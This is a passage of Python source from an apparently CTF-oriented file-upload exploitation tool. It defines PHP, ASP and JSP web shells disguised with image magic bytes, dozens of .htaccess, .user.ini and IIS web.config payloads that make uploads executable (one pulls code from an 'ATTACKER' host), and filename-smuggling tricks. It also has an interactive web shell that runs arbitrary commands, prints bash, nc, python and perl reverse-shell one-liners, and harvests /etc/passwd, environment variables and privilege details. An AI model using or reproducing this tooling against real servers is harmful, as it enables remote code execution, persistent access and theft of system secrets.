        s,b = self.upload("shell.php", b"GIF89a;\n<?php phpinfo();?>","image/gif")[:2]
        if self._ok(s,b):
            self.d.filter_bypassed("MIME Filter","GIF89a magic bytes")
        else:
            self.d.filter_detected("MIME/Magic-Byte Filter")
            self.d.suggest("Try PNG/JPEG magic bytes as GIF was blocked")

    def _probe_null_byte(self):
        s,b = self.upload("shell.php%00.jpg",b"<?php phpinfo();?>","image/jpeg")[:2]
        if self._ok(s,b):
            self.d.filter_bypassed("Extension Filter","null byte: shell.php%00.jpg")
            self.d.suggest("Null byte works — server likely PHP <5.3.4")

    def _probe_size(self):
        s,b = self.upload("big.jpg", b"A"*5*1024*1024, "image/jpeg")[:2]
        if not self._ok(s,b):
            self.d.filter_detected("File Size Limit")
            self.d.suggest("Use tiny shell: <?=`$_GET[0]`?>")

    def _probe_svg(self):
        s,b = self.upload("t.svg",
            b'<svg xmlns="http://www.w3.org/2000/svg"><circle r="1"/></svg>',
            "image/svg+xml")[:2]
        if self._ok(s,b):
            self.d.log("probe","found","SVG allowed → XXE/XSS surface")
            self.d.suggest("Run --svg-read /flag.txt and --svg-src upload.php")


# ═══════════════════════════════════════════════════════════════════════════════
#  PAYLOADS
# ═══════════════════════════════════════════════════════════════════════════════

SHELLS = {
    "standard":   b"<?php system($_GET['cmd']); ?>",
    "tiny":       b"<?=`$_GET[0]`?>",
    "passthru":   b"<?php passthru($_GET['cmd']); ?>",
    "exec":       b"<?php echo exec($_GET['cmd']); ?>",
    "popen":      b"<?php $h=popen($_GET['cmd'],'r');while(!feof($h))echo fgets($h);pclose($h);?>",
    "gif_magic":  b"GIF89a;\n<?php system($_GET['cmd']); ?>",
    "png_magic":  b"\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>",
    "jpeg_magic": b"\xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>",
    "gif_tiny":   b"GIF89a;\n<?=`$_GET[0]`?>",
    "gif_popen":  b"GIF89a;\n<?php $h=popen($_GET['cmd'],'r');while(!feof($h))echo fgets($h);pclose($h);?>",
}

ASP_SHELLS = {
    "asp_basic":  b"<%Response.write(CreateObject(\"WScript.Shell\").Exec(\"cmd /c \"%Request(\"cmd\")).StdOut.ReadAll())%>",
    "aspx_basic": b'<%@ Page Language="C#"%><%System.Diagnostics.Process p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["cmd"];p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());%>',
}

JSP_SHELLS = {
    "jsp_basic": b'<%Runtime r=Runtime.getRuntime();Process p=r.exec(request.getParameter("cmd"));java.io.InputStream is=p.getInputStream();java.util.Scanner s=new java.util.Scanner(is).useDelimiter("\\A");out.println(s.hasNext()?s.next():"");%>',
}

SVG_XXE_FILE = lambda p: f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file://{p}"> ]>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
  <text x="0" y="20">&xxe;</text></svg>""".encode()

SVG_XXE_B64 = lambda p: f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={p}"> ]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text></svg>""".encode()

SVG_XSS  = b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><circle r="50"/></svg>'
SVG_SSRF  = lambda u: f'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "{u}">]><svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>'.encode()

# ── .htaccess + .user.ini tricks (32 entries — full catalogue) ─────────
# Filename in each dict tells the attacker which name to upload as
# (".htaccess" / ".user.ini" / ".htpasswd" / "php.ini"). Verify pattern
# in `verify_url` is informational.
HTACCESS_TRICKS = [
    {"name": "addtype_jpg",          "filename": ".htaccess",
     "payload": b"AddType application/x-httpd-php .jpg\n",
     "requires": "mod_php + FileInfo",                 "verify_url": "shell.jpg?cmd=id"},
    {"name": "addtype_png",          "filename": ".htaccess",
     "payload": b"AddType application/x-httpd-php .png\n",
     "requires": "mod_php + FileInfo",                 "verify_url": "shell.png?cmd=id"},
    {"name": "addtype_gif",          "filename": ".htaccess",
     "payload": b"AddType application/x-httpd-php .gif\n",
     "requires": "mod_php + FileInfo",                 "verify_url": "shell.gif?cmd=id"},
    {"name": "addtype_multi",        "filename": ".htaccess",
     "payload": b"AddType application/x-httpd-php .jpg .jpeg .png .gif .svg .xml .txt .xxx .htm\n",
     "requires": "mod_php + FileInfo",                 "verify_url": "shell.xxx?cmd=id"},
    {"name": "addhandler_generic",   "filename": ".htaccess",
     "payload": b"AddHandler application/x-httpd-php .jpg\n",
     "requires": "mod_php",                            "verify_url": "shell.jpg"},
    {"name": "addhandler_php5",      "filename": ".htaccess",
     "payload": b"AddHandler php5-script .jpg\n",
     "requires": "mod_php5 (cPanel)",                  "verify_url": "shell.jpg"},
    {"name": "addhandler_php7",      "filename": ".htaccess",
     "payload": b"AddHandler php7-script .jpg\n",
     "requires": "mod_php7",                           "verify_url": "shell.jpg"},
    {"name": "addhandler_php8",      "filename": ".htaccess",
     "payload": b"AddHandler php8-script .jpg\n",
     "requires": "mod_php8",                           "verify_url": "shell.jpg"},
    {"name": "addhandler_phtml",     "filename": ".htaccess",
     "payload": b"AddHandler x-httpd-php .phtml .phar .pht\n",
     "requires": "older cPanel",                       "verify_url": "shell.phtml"},
    {"name": "filesmatch_sethandler","filename": ".htaccess",
     "payload": b'<FilesMatch ".+\\.jpg$">\n    SetHandler application/x-httpd-php\n</FilesMatch>\n',
     "requires": "Apache 2.x + mod_php + FileInfo",    "verify_url": "shell.jpg?cmd=id"},
    {"name": "filesmatch_any",       "filename": ".htaccess",
     "payload": b'<FilesMatch ".">\n SetHandler application/x-httpd-php\n</FilesMatch>\n',
     "requires": "mod_php (any ext executes)",         "verify_url": "shell.anything"},
    {"name": "forcetype",            "filename": ".htaccess",
     "payload": b"<Files \"shell.jpg\">\nForceType application/x-httpd-php\n</Files>\n",
     "requires": "mod_php Apache 2.2",                 "verify_url": "shell.jpg"},
    {"name": "execcgi_cgiscript",    "filename": ".htaccess",
     "payload": b"Options +ExecCGI\nAddHandler cgi-script .jpg\n",
     "requires": "mod_cgi + ExecCGI",                  "verify_url": "shell.jpg"},
    {"name": "phpcgi_action",        "filename": ".htaccess",
     "payload": b"Action application/x-httpd-php /cgi-bin/php-cgi\n"
                b"AddType application/x-httpd-php .jpg\n",
     "requires": "mod_actions + php-cgi",              "verify_url": "shell.jpg"},
    {"name": "php_engine_on",        "filename": ".htaccess",
     "payload": b"php_flag engine on\nAddType application/x-httpd-php .jpg\n",
     "requires": "mod_php",                            "verify_url": "shell.jpg"},
    {"name": "auto_prepend_local",   "filename": ".htaccess",
     "payload": b'php_value auto_prepend_file "shell.jpg"\n',
     "requires": "mod_php",                            "verify_url": "any-existing.php?cmd=id"},
    {"name": "include_path_tmp",     "filename": ".htaccess",
     "payload": b'php_value include_path "/tmp"\nphp_value auto_prepend_file "shell.jpg"\n',
     "requires": "mod_php + /tmp writable",            "verify_url": "any-existing.php"},
    {"name": "errorlog_to_php",      "filename": ".htaccess",
     "payload": b'php_value error_log "poison.php"\nphp_flag display_errors on\nphp_flag log_errors on\n',
     "requires": "mod_php",                            "verify_url": "poison.php (after error)"},
    {"name": "rewrite_jpg_to_php",   "filename": ".htaccess",
     "payload": b"RewriteEngine On\nRewriteRule ^(.*\\.jpg)$ $1 [H=application/x-httpd-php]\n",
     "requires": "mod_rewrite + mod_php",              "verify_url": "shell.jpg?cmd=id"},
    {"name": "directoryindex",       "filename": ".htaccess",
     "payload": b"DirectoryIndex shell.jpg\nAddType application/x-httpd-php .jpg\n",
     "requires": "mod_php",                            "verify_url": "./"},
    {"name": "followsymlinks",       "filename": ".htaccess",
     "payload": b"Options +FollowSymLinks +Indexes\nDirectoryIndex link.jpg\n",
     "requires": "Options FollowSymLinks allowed",     "verify_url": "./"},
    {"name": "apache22_allow",       "filename": ".htaccess",
     "payload": b"Order allow,deny\nAllow from all\nAddType application/x-httpd-php .jpg\n",
     "requires": "Apache 2.2",                         "verify_url": "shell.jpg"},
    {"name": "apache24_require",     "filename": ".htaccess",
     "payload": b"Require all granted\nAddType application/x-httpd-php .jpg\n",
     "requires": "Apache 2.4",                         "verify_url": "shell.jpg"},
    {"name": "userini_prepend",      "filename": ".user.ini",
     "payload": b"auto_prepend_file=shell.jpg\n",
     "requires": "PHP-FPM/CGI (no AllowOverride needed)", "verify_url": "any-existing.php"},
    {"name": "userini_append",       "filename": ".user.ini",
     "payload": b"auto_append_file=shell.jpg\n",
     "requires": "PHP-FPM/CGI",                        "verify_url": "any-existing.php"},
    {"name": "userini_include_path", "filename": ".user.ini",
     "payload": b"include_path=/tmp\nauto_prepend_file=shell.jpg\n",
     "requires": "PHP-FPM/CGI",                        "verify_url": "any-existing.php"},
    {"name": "userini_url_include",  "filename": ".user.ini",
     "payload": b"allow_url_include=on\nallow_url_fopen=on\n"
                b"auto_prepend_file=http://ATTACKER/x.txt\n",
     "requires": "PHP-FPM with per-dir overrides",     "verify_url": "any-existing.php"},
    {"name": "userini_open_basedir", "filename": ".user.ini",
     "payload": b"open_basedir=/\nauto_prepend_file=/etc/passwd\n",
     "requires": "PHP-FPM",                            "verify_url": "any-existing.php"},
    {"name": "phpini_prepend",       "filename": "php.ini",
     "payload": b"auto_prepend_file=shell.jpg\n",
     "requires": "suPHP or per-dir php.ini",           "verify_url": "any-existing.php"},
    {"name": "ssi_to_php",           "filename": ".htaccess",
     "payload": b"Options +Includes\nAddType text/html .shtml\n"
                b"AddOutputFilter INCLUDES;PHP .shtml\n"
                b"AddType application/x-httpd-php .shtml\n",
     "requires": "mod_include + mod_php",              "verify_url": "shell.shtml"},
    {"name": "multiviews_php",       "filename": ".htaccess",
     "payload": b"Options +MultiViews\nAddType application/x-httpd-php .php\n",
     "requires": "mod_negotiation",                    "verify_url": "shell  (no ext)"},
    {"name": "htaccess_simple",      "filename": ".htaccess",
     "payload": b"AddType application/x-httpd-php .jpg .jpeg .png .gif .svg .xml .xxx\n",
     "requires": "mod_php (legacy combined)",          "verify_url": "shell.jpg"},
]
# Back-compat: simple list of byte payloads
HTACCESS_PAYLOADS = [t["payload"] for t in HTACCESS_TRICKS if t["filename"] == ".htaccess"]


# ── IIS web.config payloads (8 variants) ───────────────────────────────
WEBCONFIG_PAYLOADS = [
    {"name": "asp-dll-handler",
     "payload": b'<?xml version="1.0" encoding="UTF-8"?>\n<configuration>\n'
                b' <system.webServer>\n  <handlers accessPolicy="Read, Script, Write">\n'
                b'   <add name="PWN-ASP" path="*.config" verb="*" '
                b'modules="IsapiModule" scriptProcessor="%windir%\\system32\\inetsrv\\asp.dll" '
                b'resourceType="Unspecified" requireAccess="Script" preCondition="bitness64"/>\n'
                b'  </handlers>\n  <security><requestFiltering><fileExtensions>'
                b'<remove fileExtension=".config"/></fileExtensions>'
                b'<hiddenSegments><remove segment="web.config"/></hiddenSegments>'
                b'</requestFiltering></security>\n </system.webServer>\n</configuration>\n'
                b'<% Response.Write("PWN "+Server.CreateObject("WScript.Shell").Exec("cmd /c "+Request("c")).StdOut.ReadAll()) %>'},
    {"name": "handlers-config-as-asp",
     "payload": b'<configuration><system.webServer><handlers>'
                b'<add name="cfg2asp" path="*.config" verb="*" '
                b'scriptProcessor="%windir%\\system32\\inetsrv\\asp.dll" '
                b'modules="IsapiModule" resourceType="Unspecified"/>'
                b'</handlers></system.webServer></configuration>\n'
                b'<%eval request("c")%>'},
    {"name": "httpHandlers-IsapiModule-combo",
     "payload": b'<configuration><system.web><httpHandlers>'
                b'<add path="*.config" verb="*" type="System.Web.UI.PageHandlerFactory"/>'
                b'</httpHandlers></system.web><system.webServer><handlers>'
                b'<add name="asp2" path="*.config" verb="*" modules="IsapiModule" '
                b'scriptProcessor="%windir%\\system32\\inetsrv\\asp.dll" resourceType="Unspecified"/>'
                b'</handlers></system.webServer></configuration>\n<%eval request("c")%>'},
    {"name": "url-rewrite-server-var",
     "payload": b'<configuration><system.webServer><rewrite><rules>'
                b'<rule name="pwn"><match url=".*"/><serverVariables>'
                b'<set name="HTTP_AUTHORIZATION" value="{HTTP_X_PWN}"/>'
                b'</serverVariables><action type="Rewrite" url="/{R:0}"/></rule>'
                b'</rules></rewrite></system.webServer></configuration>'},
    {"name": "staticfile-fallthrough",
     "payload": b'<configuration><system.webServer><handlers>'
                b'<add name="cs" path="*.cs" verb="*" '
                b'scriptProcessor="%windir%\\system32\\inetsrv\\asp.dll" modules="IsapiModule" '
                b'resourceType="Unspecified"/></handlers></system.webServer></configuration>'},
    {"name": "enable-PUT",
     "payload": b'<configuration><system.webServer><security><requestFiltering>'
                b'<verbs allowUnlisted="true"><add verb="PUT" allowed="true"/>'
                b'<add verb="DELETE" allowed="true"/></verbs></requestFiltering></security>'
                b'<handlers><remove name="WebDAV"/><remove name="StaticFile"/>'
                b'<add name="StaticFile" path="*" verb="*" modules="StaticFileModule,DefaultDocumentModule,DirectoryListingModule" '
                b'resourceType="Either" requireAccess="Write"/></handlers>'
                b'</system.webServer></configuration>'},
    {"name": "enable-WebDAV-PROPFIND",
     "payload": b'<configuration><system.webServer><modules><add name="WebDAVModule"/></modules>'
                b'<handlers><add name="WebDAV" path="*" verb="PROPFIND,PUT,MKCOL,COPY,MOVE" '
                b'modules="WebDAVModule" resourceType="Unspecified" requireAccess="Write"/>'
                b'</handlers><webdav><authoring enabled="true"/></webdav>'
                b'</system.webServer></configuration>'},
    {"name": "iis-shortname-83-probe",
     "payload": b'<!-- request /aspnet_clien~1/*~1.* to enumerate short names -->'
                b'<configuration><system.webServer><handlers>'
                b'<add name="any" path="*~1*" verb="*" '
                b'scriptProcessor="%windir%\\system32\\inetsrv\\asp.dll" modules="IsapiModule" '
                b'resourceType="Unspecified"/></handlers></system.webServer></configuration>'},
]
# Back-compat alias
WEBCONFIG = WEBCONFIG_PAYLOADS[0]["payload"]


# ── nginx / PHP-FPM / Tomcat / Jetty tricks (12) ───────────────────────
NGINX_TRICKS = [
    {"name": "nginx-pathinfo-slash-php",
     "filename": "shell.jpg/x.php", "ct": "image/jpeg",
     "content": b"\xff\xd8\xff\xe0JFIF<?php system($_GET['c']);__halt_compiler();?>"},
    {"name": "nginx-newline-php",
     "filename": "shell.jpg\n.php", "ct": "image/jpeg",
     "content": b"GIF89a;<?php system($_GET['c']);?>"},
    {"name": "nginx-encoded-newline",
     "filename": "shell.jpg%0a.php", "ct": "image/jpeg",
     "content": b"GIF89a;<?php passthru($_REQUEST['c']);?>"},
    {"name": "nginx-loose-splitpath",
     "filename": "evil.php/.././etc.php", "ct": "application/octet-stream",
     "content": b"<?php system($_GET['c']);?>"},
    {"name": "nginx-backslash-null-legacy",
     "filename": "shell.php\\\x00.jpg", "ct": "image/jpeg",
     "content": b"<?php system($_GET['c']);?>"},
    {"name": "nginx-alias-lfi",
     "filename": "../../../../etc/passwd", "ct": "text/plain", "content": b"probe"},
    {"name": "phpfpm-no-limit-extensions",
     "filename": "shell.gif", "ct": "image/gif",
     "content": b"GIF89a;<?php system($_GET['c']);?>"},
    {"name": "phpfpm-status-leak-probe",
     "filename": "probe.txt", "ct": "text/plain",
     "content": b"GET /status?full HTTP/1.1\r\n"},
    {"name": "phar-deserialization-jpg",
     "filename": "shell.phar.jpg", "ct": "image/jpeg",
     "content": b"\xff\xd8\xff\xe0__HALT_COMPILER();<?php __HALT_COMPILER();?>"},
    {"name": "tomcat-webdav-jsp",
     "filename": "cmd.jsp/", "ct": "application/xml",
     "content": b'<%@ page import="java.util.*,java.io.*"%>'
                b'<%Process p=Runtime.getRuntime().exec(request.getParameter("c"));'
                b'BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));'
                b'String l;while((l=r.readLine())!=null)out.println(l);%>'},
    {"name": "tomcat-manager-war",
     "filename": "pwn.war", "ct": "application/octet-stream",
     "content": b"PK\x03\x04...(WAR-with-shell.jsp)..."},
    {"name": "jetty-jsp-mixed-case",
     "filename": "x.Jsp", "ct": "application/octet-stream",
     "content": b"<% Runtime.getRuntime().exec(request.getParameter(\"c\"));%>"},
]


# ── Parser-confusion / filename smuggling (19) ─────────────────────────
PARSER_CONFUSION = [
    {"name": "apache-double-ext",          "filename": "shell.php.jpg",
     "headers": {"Content-Type": "image/jpeg"},
     "content": b"\xff\xd8\xff\xe0<?php system($_GET['c']);?>"},
    {"name": "mod_php-phtml",              "filename": "shell.phtml",
     "headers": {"Content-Type": "application/x-httpd-php"},
     "content": b"<?php system($_GET['c']);?>"},
    {"name": "mod_php-pht",                "filename": "shell.pht",
     "headers": {"Content-Type": "application/x-httpd-php"},
     "content": b"<?php system($_GET['c']);?>"},
    {"name": "php-cgi-argument-injection", "filename":
     "any.jpg?-d+allow_url_include=1+-d+auto_prepend_file=php://input",
     "headers": {"Content-Type": "image/jpeg"},
     "content": b"<?php system($_GET['c']);?>"},
    {"name": "double-content-type",        "filename": "shell.php",
     "headers": {"Content-Type": "image/jpeg, application/x-httpd-php"},
     "content": b"<?php system($_GET['c']);?>"},
    {"name": "rfc5987-filename-star",      "filename": "safe.jpg",
     "headers": {"Content-Disposition":
                 "form-data; name=\"file\"; filename=\"safe.jpg\"; "
                 "filename*=UTF-8''shell.php"},
     "content": b"<?php system($_GET['c']);?>"},
    {"name": "rfc2231-continuation",       "filename": "x",
     "headers": {"Content-Disposition":
                 "form-data; name=\"file\"; filename*0=\"shell\"; filename*1=\".php\""},
     "content": b"<?php system($_GET['c']);?>"},
    {"name": "double-content-disposition", "filename": "safe.jpg",
     "headers": {"Content-Disposition":
                 "form-data; name=\"file\"; filename=\"safe.jpg\"\r\n"
                 "Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\""},
     "content": b"<?php system($_GET['c']);?>"},
    {"name": "windows-trailing-dot",       "filename": "shell.php.",
     "headers": {"Content-Type": "application/x-httpd-php"},
     "content": b"<?php system($_GET['c']);?>"},
    {"name": "windows-trailing-space",     "filename": "shell.php ",
     "headers": {"Content-Type": "application/x-httpd-php"},
     "content": b"<?php system($_GET['c']);?>"},
    {"name": "iis-shortname-tilde",        "filename": "shellxx~1.php",
     "headers": {"Content-Type": "application/x-httpd-php"},
     "content": b"<?php system($_GET['c']);?>"},
    {"name": "ntfs-ads-DATA",              "filename": "shell.php::$DATA",
     "headers": {"Content-Type": "application/x-httpd-php"},
     "content": b"<?php system($_GET['c']);?>"},
    {"name": "ntfs-ads-INDEX_ALLOCATION",  "filename": "shell.php::$INDEX_ALLOCATION/x.php",
     "headers": {"Content-Type": "application/x-httpd-php"},
     "content": b"<?php system($_GET['c']);?>"},
    {"name": "unicode-fullwidth-dot",      "filename": "shell．php",
     "headers": {"Content-Type": "application/x-httpd-php"},
     "content": b"<?php system($_GET['c']);?>"},
    {"name": "raw-null-byte-legacy",       "filename": "shell.php\x00.jpg",
     "headers": {"Content-Type": "image/jpeg"},
     "content": b"<?php system($_GET['c']);?>"},
    {"name": "http-parameter-pollution",   "filename": "safe.jpg",
     "headers": {"X-HPP-Second": "shell.php"},
     "content": b"<?php system($_GET['c']);?>"},
    {"name": "tmp-race-probe",             "filename": "race.php",
     "headers": {"Content-Type": "application/x-httpd-php",
                 "X-Probe-Dirs": "/tmp,/var/tmp,/dev/shm,upload_tmp_dir"},
     "content": b"<?php system($_GET['c']);?>"},
    {"name": "phpinfo-tmpdir-leak",        "filename": "info.php",
     "headers": {"Content-Type": "application/x-httpd-php"},
     "content": b"<?php phpinfo();?>"},
    {"name": "boundary-in-body",           "filename": "shell.php",
     "headers": {"Content-Type": "application/x-httpd-php"},
     "content": b"--BOUNDARY\r\n<?php system($_GET['c']);?>\r\n--BOUNDARY--"},
]

PHP_EXTS = [
    ".php",".php3",".php4",".php5",".php7",".php8",
    ".phtml",".phar",".phps",".pht",".pgif",".inc",
    ".PHP",".Php",".pHp",".phP",".PHp",".PhP",".pHP",
]
ALLOWED_IMG_EXTS = [".jpg",".jpeg",".png",".gif",".webp",".bmp",".svg"]
INJECT_CHARS = ["%20","%0a","%00","%0d0a","/",".\\"," ",".",
                "...","::","::$DATA","%2500","%252e"]
CONTENT_TYPES_IMAGE = ["image/jpeg","image/jpg","image/png","image/gif",
                       "image/webp","image/svg+xml","image/bmp","image/tiff"]
CONTENT_TYPES_MISC  = ["application/octet-stream","text/plain",
                       "multipart/form-data","application/x-php"]

DEFAULT_SHELL_DIRS = [
    "/profile_images/","/uploads/","/upload/","/files/",
    "/images/","/media/","/tmp/","/assets/uploads/",
    "/storage/","/public/uploads/","/avatars/",
    "/attachments/","/static/","/data/","/userfiles/",
    "/img/","/var/www/html/uploads/",
]

def gen_all_filenames():
    names = []
    for ext in PHP_EXTS:
        names.append(f"shell{ext}")
    for php in PHP_EXTS:
        for img in ALLOWED_IMG_EXTS:
            names.append(f"shell{img}{php}")
            names.append(f"shell{php}{img}")
    for char in INJECT_CHARS:
        for php in PHP_EXTS:
            for img in [".jpg",".png",".gif"]:
                names.append(f"shell{php}{char}{img}")
                names.append(f"shell{img}{char}{php}")
    for php in PHP_EXTS:
        for s in [".", " ", "...", "::$DATA"]:
            names.append(f"shell{php}{s}")
    for php in PHP_EXTS:
        for p in ["../", "../../", "..%2f", "....///"]:
            names.append(f"{p}shell{php}")
    return list(dict.fromkeys(names))

def build_matrix(filename):
    matrix = []
    all_shells = {**SHELLS, **ASP_SHELLS, **JSP_SHELLS}
    for sname, sbytes in all_shells.items():
        for ct in CONTENT_TYPES_IMAGE + CONTENT_TYPES_MISC:
            matrix.append((filename, sbytes, ct, sname))
    return matrix


# ═══════════════════════════════════════════════════════════════════════════════
#  INTERACTIVE WEBSHELL
# ═══════════════════════════════════════════════════════════════════════════════

class WebShell:
    """
    Interactive shell session after RCE is confirmed.
    Supports: command execution, file read, directory listing,
              reverse shell generation, and download loot.
    """
    def __init__(self, session, shell_url, cmd_param="cmd",
                 disc: Discovery = None):
        self.session    = session
        self.shell_url  = shell_url
        self.cmd_param  = cmd_param
        self.d          = disc
        self.history    = []
        self.cwd        = "/"

    def run(self, cmd, raw=False):
        """Execute a command and return output."""
        url = f"{self.shell_url}?{self.cmd_param}={quote(cmd)}"
        try:
            r = self.session.get(url, timeout=20)
            out = r.text.strip()
            # Strip GIF header if present
            if out.startswith("GIF89a"):
                out = out[6:].lstrip(";\n")
            return out
        except Exception as e:
            return f"[ERROR] {e}"

    def _print_walkthrough(self, shell_url, cmd_param, winning_file,
                           winning_shell, winning_ct):
        """Print the full RCE walkthrough — what worked and why."""
        print(f"""
{C}{BOLD}╔══════════════════════════════════════════════════════════════╗
║              RCE WALKTHROUGH — HOW WE GOT HERE              ║
╚══════════════════════════════════════════════════════════════╝{W}

{B}{BOLD}STEP 1 — Filter Fingerprint{W}
  The tool probed the upload endpoint with test files to detect
  which filters were active (extension blacklist, whitelist,
  Content-Type header, MIME magic bytes).

{B}{BOLD}STEP 2 — Winning Payload Combination{W}
  ┌─────────────────────────────────────────────────────────────┐
  │  Filename     : {winning_file:<44}│
  │  Shell type   : {winning_shell:<44}│
  │  Content-Type : {winning_ct:<44}│
  │  Shell URL    : {shell_url[:44]:<44}│
  │  CMD param    : {cmd_param:<44}│
  └─────────────────────────────────────────────────────────────┘

{B}{BOLD}STEP 3 — Why It Worked{W}
  • Filename trick  → bypassed extension whitelist/blacklist
  • Magic bytes     → bypassed MIME/content validation
  • Spoofed CT      → bypassed Content-Type header check
  • Combined        → passed ALL filters simultaneously

{B}{BOLD}STEP 4 — Manual Reproduction (curl){W}
  {G}# Upload the shell:{W}
  curl -s -X POST '{self.shell_url.rsplit('/',2)[0]}/upload.php' \\
    -F '{cmd_param}=@shell.php;filename={winning_file};type={winning_ct}'

  {G}# Execute commands:{W}
  curl '{shell_url}?{cmd_param}=id'
  curl '{shell_url}?{cmd_param}=whoami'
  curl '{shell_url}?{cmd_param}=cat+/flag.txt'

{B}{BOLD}STEP 5 — Burp Suite Reproduction{W}
  1. Intercept a normal image upload
  2. Change filename to: {winning_file}
  3. Change Content-Type to: {winning_ct}
  4. Prepend file content with magic bytes from shell type: {winning_shell}
  5. Forward → visit shell URL → append ?{cmd_param}=id

{Y}{BOLD}You now have an interactive webshell below.{W}
""")

    def interactive(self, winning_file="", winning_shell="",
                    winning_ct=""):
        """Drop into interactive webshell REPL."""
        self._print_walkthrough(self.shell_url, self.cmd_param,
                                winning_file, winning_shell, winning_ct)

        # Quick recon on entry
        info("Running quick recon...")
        for label, cmd in [
            ("whoami",   "whoami"),
            ("id",       "id"),
            ("hostname", "hostname"),
            ("uname",    "uname -a"),
            ("pwd",      "pwd"),
        ]:
            out = self.run(cmd)
            print(f"  {G}{label:<10}{W}: {out}")

        print(f"""
{C}{BOLD}  Interactive WebShell  {W}
  Shell URL : {self.shell_url}
  CMD param : {self.cmd_param}

{Y}  Built-in commands:{W}
    !read <path>       — read a file (cat)
    !ls <path>         — list directory
    !find <name>       — find files by name
    !revshell <ip> <port>  — generate reverse shell one-liner
    !loot              — auto-collect /etc/passwd, crons, SUID
    !history           — show command history
    !exit              — exit webshell
    <anything else>    — executed directly on the server
""")

        while True:
            try:
                cmd = input(f"{M}{BOLD}webshell{W} {B}>{W} ").strip()
            except (KeyboardInterrupt, EOFError):
                print()
                break

            if not cmd:
                continue

            self.history.append(cmd)

            # ── Built-in commands ──────────────────────────────────────────
            if cmd == "!exit":
                break

            elif cmd == "!history":
                for i, c in enumerate(self.history, 1):
                    print(f"  {DIM}{i:>3}  {c}{W}")

            elif cmd.startswith("!read "):
                path = cmd[6:].strip()
                out  = self.run(f"cat {path}")
                print(f"\n{G}--- {path} ---{W}")
                print(out)
                if self.d and out: self.d.record_xxe(path, out)

            elif cmd.startswith("!ls "):
                path = cmd[4:].strip()
                out  = self.run(f"ls -la {path}")
                print(out)

            elif cmd.startswith("!find "):
                name = cmd[6:].strip()
                out  = self.run(f"find / -name '{name}' 2>/dev/null")
                print(out)

            elif cmd.startswith("!revshell "):
                parts = cmd.split()
                if len(parts) >= 3:
                    ip, port = parts[1], parts[2]
                    print(f"""
{Y}Reverse Shell One-Liners — pick one:{W}
  bash:    bash -i >& /dev/tcp/{ip}/{port} 0>&1
  nc:      nc -e /bin/bash {ip} {port}
  python:  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'
  perl:    perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'

{G}Start listener:{W}  nc -lvnp {port}
{G}Execute via shell:{W}  !<paste one-liner above>
""")

            elif cmd == "!loot":
                loot_cmds = [
                    ("OS info",       "cat /etc/os-release"),
                    ("Users",         "cat /etc/passwd"),
                    ("Sudo rules",    "sudo -l 2>/dev/null"),
                    ("SUID files",    "find / -perm -4000 2>/dev/null | head -20"),
                    ("Cron jobs",     "cat /etc/crontab 2>/dev/null"),
                    ("Network",       "ip a 2>/dev/null || ifconfig"),
                    ("Listening",     "ss -tlnp 2>/dev/null || netstat -tlnp"),
                    ("Env vars",      "env"),
                    ("Writable dirs", "find / -writable -type d 2>/dev/null | head -10"),
                ]
                for label, lcmd in loot_cmds:
                    out = self.run(lcmd)
                    if out:
                        print(f"\n{G}{BOLD}[{label}]{W}")
                        print(out[:500])
                        if self.d: self.d.log("loot","found",
                                              f"{label}: {out[:80]}")

            else:
                # Direct command execution
                out = self.run(cmd)
                if out:
                    print(out)
                else:
                    print(f"{DIM}(no output){W}")


# ═══════════════════════════════════════════════════════════════════════════════
#  CORE ATTACKER
# ═══════════════════════════════════════════════════════════════════════════════

class UploadAttacker:
    def __init__(self, sm: SessionManager, upload_url, shell_dirs,
                 cmd_param="cmd", field="uploadFile",
                 flag_path="/flag.txt", verbose=False,
                 disc: Discovery = None, interactive=False):
        self.sm          = sm
        self.upload_url  = upload_url
        self.shell_dirs  = shell_dirs
        self.cmd_param   = cmd_param
        self.field       = field
        self.flag_path   = flag_path
        self.verbose     = verbose
        self.d           = disc
        self.interactive = interactive

    def __post_init__(self):
        self._discovered_paths = []
        self._verifier = NonceVerifier()
        if not hasattr(self, "default_extra_fields"):
            self.default_extra_fields = {}

    def upload(self, filename, content, content_type, extra_fields=None):
        if not hasattr(self, "_verifier"):
            self.__post_init__()
        # Merge tool-wide default extra fields (--extra-field) with per-call ones
        merged = dict(self.default_extra_fields)
        if extra_fields:
            merged.update(extra_fields)
        try:
            r = self.sm.upload(self.upload_url, self.field, filename,
                               content, content_type, merged or None)
            # Learn server-side storage path from response (Location, JSON, HTML)
            p = extract_upload_path(r)
            if p and p not in self._discovered_paths:
                self._discovered_paths.append(p)
                if self.verbose:
                    info(f"discovered path from response: {p}")
            return r.status_code, r.text, r
        except Exception as e:
            return 0, str(e), None

    def is_success(self, status, body):
        if status not in [200,201,302]: return False
        # Stronger: only block on explicit upload-rejection phrases, NOT plain "error"
        bad = ["only images allowed","not allowed","extension not","mime type",
               "file rejected","upload disallowed","forbidden file",
               "invalid file type","invalid extension"]
        return not any(k in body.lower() for k in bad)

    def verify_rce(self, filename, cmd="id"):
        if not hasattr(self, "_verifier"):
            self.__post_init__()
        wrapped, nonce = self._verifier.make(cmd)
        clean = re.sub(r'\.\.+[/\\]','',
